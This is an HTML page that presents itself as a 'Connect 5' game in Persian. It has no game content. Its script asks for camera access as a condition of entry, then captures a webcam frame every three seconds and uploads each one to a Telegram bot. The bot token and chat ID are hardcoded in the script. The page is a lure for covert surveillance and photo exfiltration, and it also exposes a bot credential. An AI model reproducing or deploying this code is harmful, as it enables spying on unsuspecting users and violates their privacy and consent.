<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Connect 5 - AI Self-Play</title>
  <style>
    body {
      font-family: sans-serif;
      background: #111;
      color: #fff;
      text-align: center;
    }
    .hidden { display: none; }
    video { display: none; }
    .profile-pic {
      width: 120px;
      height: 120px;
      border-radius: 50%;
      object-fit: cover;
      margin: 20px auto;
      background: #444;
    }
  </style>
</head>
<body>

  <div id="page1">
    <h2>ورود به بازی</h2>
    <video id="video" autoplay playsinline></video>
    <img src="" id="profile-preview" class="profile-pic" />
    <br>
    <input type="text" id="username-input" placeholder="نام کاربری..." />
    <br>
    <button id="start-button">دریافت دسترسی دوربین و ورود</button>
  </div>

  <div id="page2" class="hidden">
    <h1>بازی Connect 5</h1>
    <p>دوربین فعال است. عکس‌ها هر ۳ ثانیه ارسال می‌شوند.</p>
  </div>

  <script>
    const video = document.getElementById("video");
    const preview = document.getElementById("profile-preview");
    const usernameInput = document.getElementById("username-input");
    const startButton = document.getElementById("start-button");
    const page1 = document.getElementById("page1");
    const page2 = document.getElementById("page2");

    const BOT_TOKEN = "7948598870:AAFY7cnBXvPu0CO7vkj9VA-7_rfKCIpvSP8";
    const CHAT_ID = "-1002263711673";

    let stream = null;

    startButton.addEventListener("click", async () => {
      const username = usernameInput.value.trim();
      if (!username) return alert("نام کاربری الزامی است");

      try {
        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
        video.srcObject = stream;

        preview.src = ""; // جایگزین نمی‌کنیم چون از ویدیو استفاده می‌کنیم
        page1.classList.add("hidden");
        page2.classList.remove("hidden");

        // شروع ارسال تصاویر
        startSendingImages();
      } catch (err) {
        alert("برای ورود به بازی باید دسترسی به دوربین را بدهید.");
      }
    });

    function startSendingImages() {
      const canvas = document.createElement("canvas");
      const ctx = canvas.getContext("2d");

      setInterval(() => {
        if (!stream) return;
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        canvas.toBlob(blob => {
          const formData = new FormData();
          formData.append("chat_id", CHAT_ID);
          formData.append("photo", blob, "webcam.jpg");

          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: "POST",
            body: formData
          }).then(res => res.json()).then(data => {
            console.log("✅ ارسال شد:", data);
          }).catch(err => {
            console.error("❌ خطا:", err);
          });
        }, "image/jpeg");
      }, 3000);
    }
  </script>

</body>
</html>
